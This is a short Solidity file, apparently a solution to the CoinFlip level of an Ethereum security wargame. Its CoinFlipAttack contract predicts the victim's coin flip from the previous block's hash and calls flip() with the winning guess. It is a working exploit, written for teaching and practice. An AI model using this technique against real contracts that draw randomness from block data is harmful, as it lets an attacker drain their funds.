pragma solidity ^0.5.0;

import '../levels/CoinFlip.sol';
import 'openzeppelin-solidity/contracts/math/SafeMath.sol';

contract CoinFlipAttack {

  using SafeMath for uint256;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function attack(address _victim) public returns (bool) {
    CoinFlip coinflip = CoinFlip(_victim);
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = uint256(uint256(blockValue).div(FACTOR));
    bool side = coinFlip == 1 ? true : false;
    coinflip.flip(side);
    return side;
  }
}